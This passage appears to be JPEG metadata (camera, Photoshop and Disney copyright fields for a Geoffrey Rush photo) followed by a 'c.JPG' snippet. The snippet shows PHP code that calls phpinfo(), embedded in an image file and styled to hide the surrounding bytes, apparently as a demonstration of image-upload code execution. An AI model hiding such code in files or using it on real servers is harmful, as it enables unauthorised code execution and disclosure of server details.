         </exif:ComponentsConfiguration>
         <exif:Flash rdf:parseType="Resource">
            <exif:Fired>False</exif:Fired>
            <exif:Return>0</exif:Return>
            <exif:Mode>0</exif:Mode>
            <exif:Function>False</exif:Function>
            <exif:RedEyeMode>False</exif:RedEyeMode>
         </exif:Flash>
         <exif:NativeDigest>36864,40960,40961,37121,37122,40962,40963,37510,40964,36867,36868,33434,33437,34850,34852,34855,34856,37377,37378,37379,37380,37381,37382,37383,37384,37385,37386,37396,41483,41484,41486,41487,41488,41492,41493,41495,41728,41729,41730,41985,41986,41987,41988,41989,41990,41991,41992,41993,41994,41995,41996,42016,0,2,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20,22,23,24,25,26,27,28,30;CB4FF41594E79B74E70EF6E485ACE320</exif:NativeDigest>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/">
         <photoshop:Source>0611-P3C-02224</photoshop:Source>
         <photoshop:DateCreated>2004-03-18</photoshop:DateCreated>
         <photoshop:ColorMode>3</photoshop:ColorMode>
         <photoshop:History/>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:tiff="http://ns.adobe.com/tiff/1.0/">
         <tiff:Make>Canon</tiff:Make>
         <tiff:Model>Canon EOS-1DS</tiff:Model>
         <tiff:Orientation>1</tiff:Orientation>
         <tiff:XResolution>3000000/10000</tiff:XResolution>
         <tiff:YResolution>3000000/10000</tiff:YResolution>
         <tiff:ResolutionUnit>2</tiff:ResolutionUnit>
         <tiff:YCbCrPositioning>2</tiff:YCbCrPositioning>
         <tiff:NativeDigest>256,257,258,259,262,274,277,284,530,531,282,283,296,301,318,319,529,532,306,270,271,272,305,315,33432;575D42837E076431FF44B6EA25D5EB3A</tiff:NativeDigest>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:xap="http://ns.adobe.com/xap/1.0/">
         <xap:CreateDate>2007-05-10T10:27:32-07:00</xap:CreateDate>
         <xap:ModifyDate>2007-05-10T10:32:05-07:00</xap:ModifyDate>
         <xap:MetadataDate>2007-05-10T10:32:05-07:00</xap:MetadataDate>
         <xap:CreatorTool>Adobe Photoshop CS2 Macintosh</xap:CreatorTool>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:xapMM="http://ns.adobe.com/xap/1.0/mm/"
            xmlns:stRef="http://ns.adobe.com/xap/1.0/sType/ResourceRef#">
         <xapMM:DerivedFrom rdf:parseType="Resource">
            <stRef:instanceID>adobe:docid:photoshop:a6a4832a-9cab-11d9-8dd4-f1f6f2f95eb5</stRef:instanceID>
            <stRef:documentID>adobe:docid:photoshop:a6a4832a-9cab-11d9-8dd4-f1f6f2f95eb5</stRef:documentID>
         </xapMM:DerivedFrom>
         <xapMM:DocumentID>uuid:378ADF1C007311DCAB7C93C7B8C4BABA</xapMM:DocumentID>
         <xapMM:InstanceID>uuid:F86D1EFF007311DCAB7C93C7B8C4BABA</xapMM:InstanceID>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:xapRights="http://ns.adobe.com/xap/1.0/rights/">
         <xapRights:Marked>True</xapRights:Marked>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:photomechanic="http://ns.camerabits.com/photomechanic/1.0/">
         <photomechanic:Prefs>0:0:0:-00001</photomechanic:Prefs>
         <photomechanic:TimeCreated>081653-0800</photomechanic:TimeCreated>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:dc="http://purl.org/dc/elements/1.1/">
         <dc:format>image/jpeg</dc:format>
         <dc:description>
            <rdf:Alt>
               <rdf:li xml:lang="x-default">GEOFFREY RUSH</rdf:li>
            </rdf:Alt>
         </dc:description>
         <dc:creator>
            <rdf:Seq>
               <rdf:li>Peter Mountain</rdf:li>
            </rdf:Seq>
         </dc:creator>
         <dc:rights>
            <rdf:Alt>
               <rdf:li xml:lang="x-default">漏 Disney Enterprises, Inc. All Rights Reserved</rdf:li>
            </rdf:Alt>
         </dc:rights>
      </rdf:Description>
   </rdf:RDF>
</x:xmpmeta>
                                   
```

```python
# c.JPG
<style>body{font-size: 0;} h1{font-size: 12px !important;}</style><h1><?php echo "<hr />THIS IMAGE COULD ERASE YOUR WWW ACCOUNT, it shows you the PHP info instead...<hr />"; phpinfo(); __halt_compiler(); ?></h1>hB?}GEOFFREY RUSH<style>body{font-size: 0Canon  Canon Canon EOS-1DS ,     ,     Adobe Photoshop CS2 Macintosh 2007:05:10 10:32:05 Peter Mountain   Disney Enterprises, Inc. All Rights Reserved
```